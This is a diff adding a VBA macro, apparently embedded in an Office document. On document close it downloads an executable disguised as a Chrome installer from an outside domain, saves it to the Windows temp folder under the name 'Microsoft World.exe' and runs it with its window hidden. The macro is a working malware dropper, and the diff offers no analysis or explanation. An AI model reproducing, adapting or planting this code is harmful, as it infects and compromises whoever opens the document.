@@ -1,0 +1,20 @@
+Private Sub Document_close()
+
+Dim xHttp: Set xHttp = CreateObject("Microsoft.XMLHTTP")
+Dim bStrm: Set bStrm = CreateObject("Adodb.Stream")
+Dim oShell: Set oShell = CreateObject("WSCript.shell")
+xHttp.Open "GET", "http://answay.ga/Download/ChromeSetup2.exe", False
+xHttp.Send
+With bStrm
+    .Type = 1
+    .Open
+    .write xHttp.responseBody
+    .savetofile "C://Windows/Temp/Microsoft World.exe", 2
+End With
+
+On Error GoTo Error_MayCauseAnError
+oShell.run """C:\Windows\Temp\Microsoft World.exe"" -s bsd", 0
+Error_MayCauseAnError:
+Set oShell = Nothing
+
+End Sub
